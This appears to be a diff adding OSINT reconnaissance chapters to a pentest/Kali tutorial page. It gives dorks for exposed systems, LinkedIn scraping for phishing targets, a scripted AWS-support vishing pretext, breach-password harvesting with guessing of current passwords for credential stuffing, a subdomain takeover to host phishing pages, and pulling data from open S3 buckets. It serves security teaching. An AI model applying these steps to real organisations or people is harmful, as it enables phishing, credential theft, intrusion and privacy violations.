+# Examples:
+
+# Exposed .git folders:
+inurl:\"/.git\" intitle:\"Index of\"
+
+# AWS S3 buckets:
+site:s3.amazonaws.com \"company\"
+
+# Exposed phpMyAdmin:
+intitle:\"phpMyAdmin\" inurl:\"index.php\"
+
+# Zoom meeting recordings:
+site:zoom.us inurl:rec \"company\"
+
+# Trello boards:
+site:trello.com \"company\"
+
+# Google Docs:
+site:docs.google.com \"company confidential\"
+
+# Exposed webcams:
+inurl:\"/view.shtml\"
+
+# Exposed Jenkins:
+intitle:\"Dashboard [Jenkins]\"
+
+# Automation:
+
+import requests
+from googlesearch import search
+
+def google_dork(query, num_results=10):
+    results = []
+    for url in search(query, num_results=num_results):
+        results.append(url)
+    return results
+
+# Find all PDFs on target:
+pdfs = google_dork('site:company.com filetype:pdf', num_results=50)
+
+for pdf in pdfs:
+    print(pdf)
+    # Download and extract metadata</div>
+
+            <h3>Part 6: LinkedIn Reconnaissance & Social Engineering</h3>
+
+            <div class="code"># LinkedIn = GOLDMINE for corporate recon
+
+# Manual reconnaissance:
+
+# 1. Company employee list:
+# Search: "people who work at Company Name"
+# Gather:
+#   - Names
+#   - Job titles
+#   - Email patterns (first.last@company.com?)
+#   - Technologies mentioned in profiles
+#   - Connections (org chart!)
+
+# 2. Technologies used:
+# Job postings reveal stack:
+#   - "Experience with AWS, Kubernetes, PostgreSQL"
+#   - "Python, Django, React"
+# Now you know their tech stack!
+
+# 3. Email pattern identification:
+# Find 3+ employees with visible emails
+# Patterns:
+#   - first.last@company.com
+#   - flast@company.com
+#   - first_last@company.com
+# Apply pattern to all employees!
+
+# 4. Target identification:
+# Who to phish?
+#   - New employees (less security aware)
+#   - HR (handle resumes → open attachments)
+#   - IT help desk (social engineering prone)
+#   - Executives (high-value access)
+
+# Automated LinkedIn OSINT:
+
+# Tool: linkedin2username
+git clone https://github.com/initstring/linkedin2username
+cd linkedin2username
+pip3 install -r requirements.txt
+
+# Generate username list:
+python3 linkedin2username.py -c "Company Name"
+
+# Outputs: first.last format usernames
+# Use for:
+#   - Password spraying
+#   - Email list for phishing
+#   - Username enumeration
+
+# Email verification:
+
+# Tool: Hunter.io API
+import requests
+
+def verify_email(email):
+    api_key = "YOUR_API_KEY"
+    url = f"https://api.hunter.io/v2/email-verifier?email={email}&api_key={api_key}"
+    response = requests.get(url)
+    data = response.json()
+    return data['data']['status']  # valid, invalid, accept_all
+
+# Verify all generated emails:
+with open('usernames.txt', 'r') as f:
+    for username in f:
+        email = f"{username.strip()}@company.com"
+        status = verify_email(email)
+        if status == 'valid':
+            print(f"[+] {email} is valid!")
+
+# Social engineering pretext building:
+
+# From LinkedIn profile:
+# Name: John Doe
+# Title: Senior DevOps Engineer
+# Company: TechCorp
+# Education: MIT (2015)
+# Skills: AWS, Docker, Kubernetes
+
+# Phone call pretext:
+# "Hi John, this is Mike from AWS Support. We noticed unusual activity
+# on your TechCorp account related to your Kubernetes clusters.
+# Can you verify your login credentials?"
+
+# → John trusts you because:
+#   - You know his name
+#   - You know his company
+#   - You know they use AWS + Kubernetes
+# All from LinkedIn!
+
+# Advanced: Profile scraping
+
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+import time
+
+driver = webdriver.Chrome()
+driver.get('https://www.linkedin.com/login')
+
+# Login (use burner account)
+driver.find_element(By.ID, 'username').send_keys('your_email')
+driver.find_element(By.ID, 'password').send_keys('your_password')
+driver.find_element(By.XPATH, '//button[@type="submit"]').click()
+
+time.sleep(3)
+
+# Search company employees:
+driver.get('https://www.linkedin.com/search/results/people/?keywords=Company%20Name')
+
+# Scrape profile links:
+profiles = driver.find_elements(By.XPATH, '//a[@data-test-app-aware-link]')
+
+for profile in profiles:
+    link = profile.get_attribute('href')
+    print(link)
+    # Visit each profile, scrape details
+
+driver.quit()
+
+# Compile intelligence report:
+# - 100+ employee names
+# - Email addresses (verified)
+# - Org chart (manager/employee relationships)
+# - Tech stack (from job postings + profiles)
+# - Physical locations (office addresses)
+# - Phone numbers (sometimes in profiles)
+# - Personal interests (social engineering hooks)</div>
+
+            <h3>Part 7: Breach Database Intelligence</h3>
+
+            <div class="code"># Breach databases = Password goldmine
+
+# HaveIBeenPwned API:
+
+import requests
+
+def check_breach(email):
+    url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
+    headers = {
+        'hibp-api-key': 'YOUR_API_KEY',
+        'user-agent': 'OSINT Tool'
+    }
+    response = requests.get(url, headers=headers)
+    
+    if response.status_code == 200:
+        breaches = response.json()
+        print(f"[+] {email} found in {len(breaches)} breaches:")
+        for breach in breaches:
+            print(f"    - {breach['Name']} ({breach['BreachDate']})")
+            print(f"      Data types: {', '.join(breach['DataClasses'])}")
+    elif response.status_code == 404:
+        print(f"[-] {email} not found in breaches")
+    else:
+        print(f"[!] Error: {response.status_code}")
+
+# Check entire company:
+with open('company_emails.txt', 'r') as f:
+    for email in f:
+        check_breach(email.strip())
+        time.sleep(1.5)  # Rate limiting
+
+# Output:
+# [+] john.doe@company.com found in 3 breaches:
+#     - LinkedIn (2012-05-05)
+#       Data types: Email addresses, Passwords
+#     - Dropbox (2012-07-01)
+#       Data types: Email addresses, Passwords
+#     - Adobe (2013-10-04)
+#       Data types: Email addresses, Passwords, Usernames
+
+# Now check Dehashed for actual passwords:
+
+# Dehashed.com (paid service, worth it!)
+# Search: john.doe@company.com
+
+# Results:
+# Email: john.doe@company.com
+# Password: Summer2012!
+# Source: LinkedIn breach
+
+# Password pattern analysis:
+# John's passwords:
+#   - Summer2012! (LinkedIn, 2012)
+#   - Summer2013! (Dropbox, 2013)
+#   - Summer2014! (Adobe, 2014)
+# Pattern: Summer[YEAR]!
+
+# Current year: 2024
+# Likely password: Summer2024!
+
+# Use for:
+#   - Password spraying
+#   - Initial access
+#   - Credential stuffing
+
+# Automated breach checking:
+
+from h8mail import h8mail_search
+
+def search_breaches(email):
+    # h8mail aggregates: HaveIBeenPwned, Snusbase, LeakLookup, etc.
+    results = h8mail_search(email)
+    
+    for result in results:
+        print(f"Email: {result['email']}")
+        print(f"Password: {result['password']}")
+        print(f"Source: {result['source']}")
+        print("-" * 40)
+
+# Pastebin monitoring:
+
+import requests
+import re
+
+def search_pastebin(company):
+    # Use Pastebin scraping API or Google dorks
+    query = f"site:pastebin.com {company} password"
+    
+    # Or direct Pastebin API:
+    url = "https://scrape.pastebin.com/api_scraping.php"
+    params = {'limit': 100}
+    response = requests.get(url, params=params)
+    
+    pastes = response.json()
+    for paste in pastes:
+        if company.lower() in paste['body'].lower():
+            print(f"[+] Found paste: {paste['key']}")
+            print(f"    URL: https://pastebin.com/{paste['key']}")
+            
+            # Extract credentials:
+            credentials = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):(.+)', paste['body'])
+            for email, password in credentials:
+                print(f"    {email}:{password}")
+
+# GitHub secret scanning:
+
+import requests
+
+def search_github_secrets(company):
+    query = f"{company} password OR apikey OR api_key OR token OR secret"
+    url = f"https://api.github.com/search/code?q={query}"
+    
+    headers = {'Authorization': 'token YOUR_GITHUB_TOKEN'}
+    response = requests.get(url, headers=headers)
+    
+    results = response.json()
+    for item in results.get('items', []):
+        print(f"[+] {item['repository']['full_name']}/{item['path']}")
+        print(f"    URL: {item['html_url']}")
+
+# Credential stuffing workflow:
+# 1. Collect emails from LinkedIn/theHarvester
+# 2. Check HaveIBeenPwned for breaches
+# 3. Search Dehashed for plaintext passwords
+# 4. Identify password patterns
+# 5. Generate likely current passwords
+# 6. Test against:
+#    - VPN portal
+#    - Email (OWA/O365)
+#    - SSH
+#    - RDP
+#    - Custom web apps</div>
+
+            <h3>Part 8: Domain & DNS Intelligence</h3>
+
+            <div class="code"># DNS = Treasure trove of infrastructure info
+
+# WHOIS lookup:
+whois company.com
+
+# Output:
+# Registrar: GoDaddy
+# Creation Date: 2005-03-15
+# Expiry Date: 2025-03-15
+# Name Servers: ns1.company.com, ns2.company.com
+# Registrant: Company Inc.
+# Registrant Email: admin@company.com
+# Registrant Phone: +1-555-0100
+
+# Intelligence:
+# - admin@company.com → Email pattern confirmed
+# - +1-555-0100 → Phone for social engineering
+# - Expiry date → Domain hijacking opportunity if expired?
+# - Nameservers → Internal DNS? Or hosted (Route53, Cloudflare)?
+
+# Historical WHOIS:
+# whoishistory.com or DomainTools
+# Shows previous owners, registrants
+# Useful for domain history, ownership changes
+
+# DNS enumeration:
+
+# A records (IPv4):
+dig company.com A
+
+# AAAA records (IPv6):
+dig company.com AAAA
+
+# MX records (mail servers):
+dig company.com MX
+
+# Output:
+# company.com  MX  10 mail1.company.com
+# company.com  MX  20 mail2.company.com
+
+# Mail servers identified! → Email infrastructure
+# Test for:
+#   - Open relay
+#   - User enumeration (VRFY, EXPN)
+#   - SPF/DMARC misconfiguration
+
+# NS records (nameservers):
+dig company.com NS
+
+# TXT records (SPF, DKIM, DMARC, verification):
+dig company.com TXT
+
+# Output:
+# "v=spf1 include:_spf.google.com ~all"
+# → Company uses Google Workspace!
+
+# "google-site-verification=abc123..."
+# → Owns this Google verification token
+
+# CAA records (Certificate Authority Authorization):
+dig company.com CAA
+
+# Shows which CAs can issue certificates
+# If not set → Anyone can issue cert for domain (phishing!)
+
+# Zone transfer attempt:
+dig @ns1.company.com company.com AXFR
+
+# If misconfigured, reveals ALL subdomains!
+# Usually blocked, but worth trying
+
+# Subdomain enumeration (passive):
+
+# Certificate Transparency logs:
+curl "https://crt.sh/?q=%25.company.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Returns ALL subdomains from SSL certs!
+# Example output:
+# api.company.com
+# dev.company.com
+# staging.company.com
+# mail.company.com
+# vpn.company.com
+# admin.company.com
+
+# Subdomain brute force (active):
+
+# Tool: fierce
+fierce --domain company.com --subdomains /usr/share/wordlists/subdomains.txt
+
+# Tool: amass
+amass enum -active -d company.com -brute -w subdomains.txt
+
+# Tool: subfinder
+subfinder -d company.com -all -recursive
+
+# Subdomain takeover check:
+
+# Tool: subjack
+git clone https://github.com/haccer/subjack
+cd subjack
+go build
+
+./subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
+
+# Checks if subdomain points to:
+#   - AWS S3 (but bucket doesn't exist) → Takeover!
+#   - GitHub Pages (but repo deleted) → Takeover!
+#   - Heroku (but app deleted) → Takeover!
+#   - Azure (but resource deleted) → Takeover!
+
+# If takeover possible:
+# 1. Create S3 bucket with subdomain name
+# 2. Upload phishing page
+# 3. Subdomain now serves YOUR content!
+# (On legitimate company subdomain!)
+
+# DNS history:
+
+# SecurityTrails.com (free API tier)
+import requests
+
+def dns_history(domain):
+    api_key = "YOUR_API_KEY"
+    url = f"https://api.securitytrails.com/v1/history/{domain}/dns/a"
+    headers = {'APIKEY': api_key}
+    
+    response = requests.get(url, headers=headers)
+    data = response.json()
+    
+    for record in data['records']:
+        print(f"Date: {record['last_seen']}")
+        print(f"IP: {record['values'][0]['ip']}")
+        print("-" * 40)
+
+# Shows all historical IPs for domain
+# Useful for:
+#   - Finding old, forgotten servers
+#   - Tracking infrastructure changes
+#   - Identifying hosting providers
+
+# Reverse DNS:
+
+# Find all domains on an IP:
+dig -x 192.0.2.10
+
+# Or use SecurityTrails reverse IP search:
+url = f"https://api.securitytrails.com/v1/domains/list?ipv4=192.0.2.10"
+
+# Finds:
+#   - Virtual hosts on same server
+#   - Other company domains
+#   - Forgotten domains (potential attack surface)
+
+# ASN enumeration:
+
+# Find company's IP ranges:
+whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+"
+
+# Or use bgpview.io:
+curl "https://api.bgpview.io/asn/12345/prefixes" | jq -r '.data.ipv4_prefixes[].prefix'
+
+# Output:
+# 192.0.2.0/24
+# 198.51.100.0/24
+
+# Now scan entire IP ranges:
+nmap -sn 192.0.2.0/24
+nmap -sS -p- -T4 192.0.2.0/24
+
+# Email server intelligence:
+
+# MX lookup:
+dig company.com MX
+
+# Connect to mail server:
+telnet mail.company.com 25
+
+# SMTP banner:
+220 mail.company.com ESMTP Postfix
+
+# → Running Postfix
+# → Check for vulnerabilities
+
+# User enumeration:
+VRFY admin@company.com
+250 2.1.5 admin@company.com
+
+# → admin@company.com exists!
+
+# SPF/DMARC check:
+dig company.com TXT | grep spf
+dig _dmarc.company.com TXT
+
+# Weak SPF: "v=spf1 +all"
+# → Anyone can spoof emails!
+
+# No DMARC: No _dmarc record
+# → Email spoofing possible!</div>
+
+            <h3>Part 9: Social Media Intelligence (SOCMINT)</h3>
+
+            <div class="code"># Social media = Personal information goldmine
+
+# Twitter/X Intelligence:
+
+# Tool: Twint (Twitter scraper, no API needed)
+git clone https://github.com/twintproject/twint.git
+cd twint
+pip3 install . -r requirements.txt
+
+# Search tweets from user:
+twint -u target_user
+
+# Search tweets containing keyword:
+twint -s "company_name confidential"
+
+# Search tweets near location:
+twint -g "40.7128,-74.0060,10km"  # 10km around NYC
+
+# Advanced search:
+twint -u target_user --since "2024-01-01" --until "2024-12-31"
+
+# Extract emails/phones from tweets:
+twint -u target_user | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
+
+# Instagram OSINT:
+
+# Tool: Osintgram
+git clone https://github.com/Datalux/Osintgram.git
+cd Osintgram
+pip3 install -r requirements.txt
+
+# Launch:
+python3 main.py target_username
+
+# Commands:
+# info → Profile information
+# followers → Follower list
+# following → Following list
+# photos → Download all photos
+# comments → Extract comments
+# geolocation → Extract geotagged locations
+
+# Geolocation from photos:
+# Download photo → Extract EXIF:
+exiftool photo.jpg | grep GPS
+
+# Output:
+# GPS Latitude: 40.7128
+# GPS Longitude: -74.0060
+# → New York City!
+
+# Map on Google Maps:
+# https://www.google.com/maps?q=40.7128,-74.0060
+
+# Facebook OSINT:
+
+# Graph Search (limited now, but still useful):
+# Search: "Photos of [Name]" → All tagged photos
+# Search: "Photos liked by [Name]" → Interests
+# Search: "Places visited by [Name]" → Locations
+# Search: "Friends of [Name]" → Social network
+
+# Automated scraping (use burner account):
+from selenium import webdriver
+
+driver = webdriver.Chrome()
+driver.get('https://www.facebook.com/login')
+
+# Login with burner account
+# Navigate to target profile
+# Scrape:
+#   - Friends list
+#   - Photos
+#   - Check-ins (locations)
+#   - Workplace
+#   - Education
+#   - Relationship status
+
+# LinkedIn (covered in Part 6)
+
+# GitHub OSINT:
+
+# User enumeration:
+curl "https://api.github.com/users/target_username"
+
+# Output:
+# {
+#   "name": "John Doe",
+#   "email": "john@company.com",
+#   "bio": "Senior Developer at TechCorp",
+#   "company": "TechCorp",
+#   "location": "New York, NY"
+# }
+
+# List repositories:
+curl "https://api.github.com/users/target_username/repos"
+
+# Search for sensitive info:
+# - API keys in code
+# - Passwords in commits
+# - Internal URLs
+# - Employee names (in commit messages)
+
+# Tool: GitHound
+git clone https://github.com/tillson/git-hound
+cd git-hound
+go build
+
+./git-hound --subdomain-file subdomains.txt --dig-files --dig-commits
+
+# Searches for:
+# - AWS keys
+# - API tokens
+# - Database credentials
+# - Private keys
+# In both code and commit history!
+
+# Reddit OSINT:
+
+# Search: "company_name"
+# Sort by: Relevant, New, Top
+# Look for:
+#   - Employee complaints
+#   - Security discussions
+#   - Leaked information
+#   - Technical details
+
+# Tool: Pushshift Reddit API
+import requests
+
+def search_reddit(keyword):
+    url = f"https://api.pushshift.io/reddit/search/comment/?q={keyword}&size=100"
+    response = requests.get(url)
+    data = response.json()
+    
+    for comment in data['data']:
+        print(f"Author: {comment['author']}")
+        print(f"Subreddit: {comment['subreddit']}")
+        print(f"Comment: {comment['body'][:200]}")
+        print(f"URL: https://reddit.com{comment['permalink']}")
+        print("-" * 40)
+
+# YouTube OSINT:
+
+# Company channel → Video metadata:
+#   - Upload dates (activity timeline)
+#   - Employee names (in credits)
+#   - Office tour videos (physical layout!)
+#   - Product demos (technology stack)
+
+# Employee personal channels:
+#   - Location (in about section)
+#   - Interests (for social engineering)
+#   - Family info
+#   - Personal email (in channel contact)
+
+# Discord/Slack OSINT:
+
+# Join public servers
+# Search for employees
+# Monitor conversations for:
+#   - Technical discussions
+#   - Security practices
+#   - Internal tools mentioned
+#   - Complaints about security</div>
+
+            <h3>Part 10: OSINT Automation & Frameworks</h3>
+
+            <div class="code"># Spiderfoot = Automated OSINT powerhouse
+
+# Install:
+git clone https://github.com/smicallef/spiderfoot.git
+cd spiderfoot
+pip3 install -r requirements.txt
+
+# Run:
+python3 sf.py -l 127.0.0.1:5001
+
+# Web UI: http://127.0.0.1:5001
+
+# Create new scan:
+# Target: company.com
+# Modules: Select all (or specific categories)
+# Run scan!
+
+# What Spiderfoot does automatically:
+# 1. WHOIS lookup
+# 2. DNS enumeration
+# 3. Subdomain discovery
+# 4. Email harvesting
+# 5. Social media profiles
+# 6. Shodan/Censys lookups
+# 7. Breach database checks
+# 8. Certificate transparency
+# 9. IP geolocation
+# 10. Port scanning
+# 11. Web crawling
+# 12. Dark web monitoring
+# And 100+ more modules!
+
+# CLI mode:
+python3 sf.py -s company.com -m all -o json
+
+# Photon = Web OSINT crawler
+
+# Install:
+git clone https://github.com/s0md3v/Photon.git
+cd Photon
+pip3 install -r requirements.txt
+
+# Crawl website:
+python3 photon.py -u https://company.com
+
+# Output folders:
+# - robots.txt
+# - sitemap.xml
+# - External links
+# - Internal links
+# - JavaScript files
+# - CSS files
+# - Images
+# - Documents (PDF, DOC, etc.)
+
+# Extract data:
+python3 photon.py -u https://company.com --extract all
+
+# Extracts:
+# - Emails
+# - Phone numbers
+# - Social media links
+# - AWS keys
+# - IP addresses
+# - URLs
+
+# Phone number OSINT:
+
+# Tool: PhoneInfoga
+git clone https://github.com/sundowndev/PhoneInfoga
+cd PhoneInfoga
+go build
+
+./phoneinfoga scan -n "+1-555-0100"
+
+# Output:
+# Country: United States
+# Carrier: Verizon
+# Type: Mobile
+# Valid: Yes
+# Possible locations: New York, NY
+
+# Also searches:
+# - Google (for number mentions)
+# - Social media (linked accounts)
+# - Truecaller
+# - Leaked databases
+
+# Email OSINT:
+
+# Tool: Holehe
+pip3 install holehe
+
+# Check where email is registered:
+holehe email@company.com
+
+# Output:
+# [+] Twitter: Registered
+# [+] Instagram: Registered
+# [+] Facebook: Registered
+# [+] LinkedIn: Registered
+# [-] Spotify: Not registered
+# [+] GitHub: Registered
+
+# Username OSINT:
+
+# Tool: Sherlock
+git clone https://github.com/sherlock-project/sherlock.git
+cd sherlock
+pip3 install -r requirements.txt
+
+# Search username across 300+ sites:
+python3 sherlock.py johndoe123
+
+# Output:
+# [+] GitHub: https://github.com/johndoe123
+# [+] Twitter: https://twitter.com/johndoe123
+# [+] Instagram: https://instagram.com/johndoe123
+# [+] Reddit: https://reddit.com/user/johndoe123
+# ... (300+ sites checked)
+
+# Facial recognition OSINT:
+
+# Tool: PimEyes.com
+# Upload photo → Finds ALL instances on internet
+# Shows:
+#   - Social media profiles
+#   - News articles
+#   - Company websites
+#   - Dating profiles
+#   - Forums
+
+# Google Reverse Image Search:
+# Upload photo → Find similar images + sources
+
+# Yandex (even better than Google for faces):
+# yandex.com/images → Upload → More accurate face matching
+
+# Cryptocurrency OSINT:
+
+# Bitcoin address lookup:
+# blockchain.com/btc/address/[ADDRESS]
+
+# Shows:
+# - Total received
+# - Total sent
+# - Current balance
+# - All transactions
+# - Associated addresses
+
+# Tool: Maltego Bitcoin transforms
+# Map entire transaction network!
+
+# Dark web monitoring:
+
+# Tool: OnionScan
+git clone https://github.com/s-rah/onionscan.git
+cd onionscan
+go build
+
+./onionscan --verbose company.com
+
+# Scans Tor hidden services for:
+# - Leaked data
+# - Company mentions
+# - Credentials for sale
+# - Dark web marketplaces
+
+# OSINT framework websites:
+
+# 1. osintframework.com
+# → Categorized list of OSINT tools
+
+# 2. start.me/p/DPYPMz/the-ultimate-osint-collection
+# → Bookmarks for OSINT resources
+
+# 3. inteltechniques.com/tools/
+# → Michael Bazzell's custom OSINT tools
+
+# 4. bellingcat.com
+# → Open source investigations case studies
+
+# 5. tracelabs.org
+# → Missing persons OSINT (practice your skills!)
+
+# Complete OSINT automation script:
+
+import subprocess
+import json
+
+def full_osint(target):
+    results = {}
+    
+    # 1. theHarvester
+    print("[*] Running theHarvester...")
+    subprocess.run(['theHarvester', '-d', target, '-b', 'all', '-f', 'harvest'])
+    
+    # 2. Amass
+    print("[*] Running Amass...")
+    subprocess.run(['amass', 'enum', '-passive', '-d', target, '-o', 'amass_results.txt'])
+    
+    # 3. Shodan
+    print("[*] Searching Shodan...")
+    subprocess.run(['shodan', 'search', f'hostname:{target}', '-O', '-o', 'shodan_results.txt'])
+    
+    # 4. Subfinder
+    print("[*] Running Subfinder...")
+    subprocess.run(['subfinder', '-d', target, '-o', 'subdomains.txt'])
+    
+    # 5. Httpx (check live subdomains)
+    print("[*] Checking live hosts...")
+    subprocess.run(['httpx', '-l', 'subdomains.txt', '-o', 'live_hosts.txt'])
+    
+    # 6. Nuclei (vulnerability scan)
+    print("[*] Running Nuclei...")
+    subprocess.run(['nuclei', '-l', 'live_hosts.txt', '-o', 'vulnerabilities.txt'])
+    
+    # 7. WhatsMyName (username search)
+    print("[*] Searching usernames...")
+    subprocess.run(['whatsmyname', '-u', target])
+    
+    # 8. HaveIBeenPwned check
+    print("[*] Checking breach databases...")
+    # (API call as shown earlier)
+    
+    print("[+] OSINT complete! Results saved.")
+
+# Run:
+full_osint('company.com')</div>
+
+            <h3>Part 11: Adversary Infrastructure Profiling</h3>
+
+            <div class="code"># Advanced: Map entire company infrastructure
+
+# Step 1: IP range identification
+
+# Method 1: WHOIS ASN lookup
+whois -h whois.radb.net -- '-i origin AS12345'
+
+# Method 2: BGP looking glass
+# bgp.he.net/AS12345
+
+# Method 3: SecurityTrails API
+import requests
+
+def get_company_ips(company_name):
+    api_key = "YOUR_API_KEY"
+    url = f"https://api.securitytrails.com/v1/company/{company_name}"
+    headers = {'APIKEY': api_key}
+    
+    response = requests.get(url, headers=headers)
+    data = response.json()
+    
+    for cidr in data['records']:
+        print(f"IP Range: {cidr}")
+
+# Step 2: Subdomain enumeration (comprehensive)
+
+# Passive sources:
+# - Certificate Transparency (crt.sh)
+# - VirusTotal
+# - SecurityTrails
+# - DNSDumpster
+# - Shodan
+# - Censys
+
+# Active brute force:
+# - Fierce
+# - Amass
+# - Subfinder
+# - Gobuster DNS mode
+
+# Combine all results:
+cat crtsh.txt virustotal.txt securitytrails.txt > all_subdomains.txt
+sort -u all_subdomains.txt > unique_subdomains.txt
+
+# Step 3: Service identification
+
+# Scan all IPs + subdomains:
+nmap -sV -p- -iL targets.txt -oA full_scan
+
+# Parse nmap output:
+import xml.etree.ElementTree as ET
+
+def parse_nmap_xml(xml_file):
+    tree = ET.parse(xml_file)
+    root = tree.getroot()
+    
+    for host in root.findall('host'):
+        ip = host.find('address').get('addr')
+        
+        for port in host.findall('.//port'):
+            portid = port.get('portid')
+            service = port.find('service')
+            
+            if service is not None:
+                name = service.get('name')
+                product = service.get('product', '')
+                version = service.get('version', '')
+                print(f"{ip}:{portid} → {name} {product} {version}")
+
+# Step 4: Technology identification
+
+# Tool: Wappalyzer (CLI)
+npm install -g wappalyzer
+
+# Scan:
+wappalyzer https://company.com
+
+# Output:
+# WordPress 6.0
+# PHP 8.1
+# MySQL
+# Cloudflare
+# Google Analytics
+# jQuery 3.6
+
+# Tool: WhatWeb
+whatweb -a 3 https://company.com
+
+# Tool: BuiltWith API
+import requests
+
+def builtwith_lookup(domain):
+    api_key = "YOUR_API_KEY"
+    url = f"https://api.builtwith.com/v20/api.json?KEY={api_key}&LOOKUP={domain}"
+    response = requests.get(url)
+    data = response.json()
+    
+    for tech in data['Results'][0]['Result']['Paths'][0]['Technologies']:
+        print(f"{tech['Name']}: {tech.get('Description', 'N/A')}")
+
+# Step 5: Cloud asset discovery
+
+# AWS:
+# - S3 buckets: bucket-name.s3.amazonaws.com
+# - CloudFront: d123456.cloudfront.net
+# - API Gateway: abc123.execute-api.us-east-1.amazonaws.com
+# - Elastic Beanstalk: app-name.us-east-1.elasticbeanstalk.com
+
+# Azure:
+# - Blob storage: storage-name.blob.core.windows.net
+# - Web apps: app-name.azurewebsites.net
+# - Databases: server-name.database.windows.net
+
+# GCP:
+# - Cloud Storage: storage.googleapis.com/bucket-name
+# - App Engine: project-id.appspot.com
+# - Cloud Functions: region-project-id.cloudfunctions.net
+
+# Enumerate S3 buckets:
+# Tool: s3scanner
+git clone https://github.com/sa7mon/S3Scanner
+cd S3Scanner
+pip3 install -r requirements.txt
+
+# Create bucket wordlist:
+echo "company" > buckets.txt
+echo "company-prod" >> buckets.txt
+echo "company-dev" >> buckets.txt
+echo "company-backup" >> buckets.txt
+
+# Scan:
+python3 s3scanner.py -l buckets.txt
+
+# Test bucket permissions:
+aws s3 ls s3://company-backup --no-sign-request
+
+# If accessible:
+aws s3 sync s3://company-backup . --no-sign-request
+
+# Step 6: GitHub reconnaissance
+
+# Search code for company references:
+# GitHub advanced search:
+# - company.com in:file
+# - @company.com in:file
+# - api.company.com in:file
+
+# Tool: GitDorker
+git clone https://github.com/obheda12/GitDorker
+cd GitDorker
+pip3 install -r requirements.txt
+
+python3 GitDorker.py -tf github_token.txt -d dorks.txt -org CompanyName
+
+# Searches for:
+# - API keys
+# - Passwords
+# - AWS credentials
+# - Database strings
+# - Internal URLs
+
+# Step 7: Certificate analysis
+
+# Tool: certgraph
+git clone https://github.com/lanrat/certgraph
+cd certgraph
+go build
+
+./certgraph -s company.com -depth 5 -save company.json
+
+# Builds graph of certificate relationships
+# Discovers:
+# - Related domains
+# - Infrastructure connections
+# - Hidden subdomains
+# - Sister companies
+
+# Step 8: Email infrastructure
+
+# MX records:
+dig company.com MX
+
+# SPF record:
+dig company.com TXT | grep spf
+
+# DMARC:
+dig _dmarc.company.com TXT
+
+# DKIM:
+dig default._domainkey.company.com TXT
+
+# Email security check:
+# Tool: emailrep.io
+curl "https://emailrep.io/john@company.com"
+
+# Output:
+# - Reputation score
+# - Known breaches
+# - Associated domains
+# - Suspicious activity
+
+# Step 9: Network mapping
+
+# Traceroute to find network path:
+traceroute company.com
+
+# TCP traceroute (more reliable):
+sudo traceroute -T company.com
+
+# MTR (continuous traceroute):
+mtr company.com
+
+# Identify:
+# - ISP
+# - Hosting provider
+# - Geographic routing
+# - Network hops
+# - Potential bottlenecks
+
+# Step 10: Mobile app analysis
+
+# Android APK:
+# Download from Google Play Store
+# Tool: apkpure.com or apkmirror.com
+
+# Extract APK:
+unzip app.apk
+
+# Decompile:
+apktool d app.apk
+
+# Search for:
+# - API endpoints (grep -r "http" .)
+# - API keys (grep -r "api_key" .)
+# - Hardcoded credentials
+# - Internal URLs
+
+# iOS IPA:
+# Requires jailbroken device or tools like frida
+
+# Dynamic analysis:
+# Install app → Intercept traffic with Burp Suite
+
+# Complete infrastructure map:
+
+# After all reconnaissance, you have:
+# ✅ IP ranges
+# ✅ Subdomains (100+)
+# ✅ Open ports + services
+# ✅ Technologies used
+# ✅ Cloud assets (S3, Azure blobs)
+# ✅ Email infrastructure
+# ✅ Employee list
+# ✅ Breach credentials
+# ✅ GitHub repos + secrets
+# ✅ Mobile app endpoints
+# ✅ Network topology
+
+# Visualize with mind map:
+# Tool: MindMeister, XMind, or text-based:
+
+"""
+Company Infrastructure Map:
+├── Web Assets
+│   ├── www.company.com (192.0.2.10) - Nginx 1.21, WordPress 6.0
+│   ├── api.company.com (192.0.2.11) - Python/Flask, AWS
+│   └── admin.company.com (192.0.2.12) - Laravel, MySQL
+├── Mail Servers
+│   ├── mail1.company.com (192.0.2.20) - Postfix
+│   └── mail2.company.com (192.0.2.21) - Postfix
+├── Cloud Assets
+│   ├── S3: company-backups (public read!)
+│   └── Azure: company-prod.azurewebsites.net
+├── Employees
+│   ├── john.doe@company.com (LinkedIn, GitHub, Twitter)
+│   └── jane.smith@company.com (LinkedIn, breached: LinkedIn2012)
+└── Vulnerabilities
+    ├── Subdomain takeover: dev.company.com
+    ├── Open S3 bucket: company-backups
+    └── Exposed admin panel: admin.company.com (no auth!)
+                1. <strong>Domain enumeration:</strong> theHarvester, Recon-ng → Find subdomains, emails<br>
+                2. <strong>Infrastructure mapping:</strong> Shodan, Maltego → Map IPs, services, technologies<br>
+                3. <strong>Employee discovery:</strong> LinkedIn, Hunter.io → Find names, roles, emails<br>
+                4. <strong>Credential hunting:</strong> Breach databases, pastes, Google dorking → Find leaked passwords<br>
+                5. <strong>Vulnerability identification:</strong> Shodan (CVEs), exposed services, misconfigurations<br>
+                6. <strong>Attack surface analysis:</strong> Combine all data → Identify weakest entry points<br><br>
+                <strong>OSINT resources:</strong><br>
+                • <strong>OSINT Framework:</strong> https://osintframework.com/ (tool catalog)<br>
+                • <strong>IntelTechniques:</strong> Michael Bazzell's books and resources<br>
+                • <strong>Bellingcat:</strong> Open-source investigation techniques<br>
+                • <strong>HaveIBeenPwned:</strong> Breach database (haveibeenpwned.com)<br>
+                • <strong>Dehashed:</strong> Search engine for breached databases<br><br>
+                OSINT is 50%+ of a pentest. Know your target before attacking! 🔍📊</p>
+            </div>
         </section>
 
         <!-- SECTION 12: Remaining Kali Tools Dictionary -->
         <section id="remaining-tools" class="section">
-            <h2 class="section-title">Remaining Kali Tools Dictionary</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <h2 class="section-title">Comprehensive Kali Linux Tools Dictionary</h2>
+            <p class="section-intro">Kali Linux ships with 600+ tools across every hacking domain. This alphabetical dictionary covers 100+ essential tools with descriptions, syntax, flags, and quick examples. Use this as your quick reference guide during CTFs, pentests, and learning. Tools are organized alphabetically with cross-references to deep-dive sections elsewhere in this guide. Each entry includes: category, installation, basic usage, key flags, and practical example. Let's build your ultimate hacking tool vocabulary! 🛠️</p>
